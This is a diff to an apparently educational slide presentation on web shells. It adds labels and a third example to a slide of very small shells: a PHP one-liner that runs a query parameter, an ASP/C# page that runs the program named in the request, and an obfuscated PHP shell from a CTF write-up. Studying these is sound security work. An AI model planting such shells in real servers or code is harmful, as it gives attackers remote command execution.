@@ -165,11 +165,17 @@ if($_GET['cmd']) {
 				<section>
 					<h2>Even smallest ones?</h2>
 					<ul>
+						<li>PHP</li>
 						<pre><code data-trim contenteditable>	
 &lt;?=`$_GET[1]`?&gt;
 						</code></pre>
+						<li>ASP/C#</li>
 						<pre><code data-trim contenteditable>	
 &lt;%@Page Language=&rdquo;C#&rdquo;%&gt;&lt;%var p=new System.Diagnostics.Process{StartInfo={FileName=Request[&ldquo;c&rdquo;],UseShellExecute=false,RedirectStandardOutput=true}};p.Start();%&gt;&lt;%=p.StandardOutput.ReadToEnd()%&gt;
+						</code></pre>
+						<li><a href="https://github.com/terjanq/Flag-Capture/tree/master/MeePwn 2018/omega">OmegaSector by @terjanq</a></li>
+						<pre><code data-trim contenteditable>	
+&lt;?=~$_='$&lt;&gt;/'^'{{{{';@${$_}[_](@${$_}[__]);
 						</code></pre>
 					</ul>
 				</section>
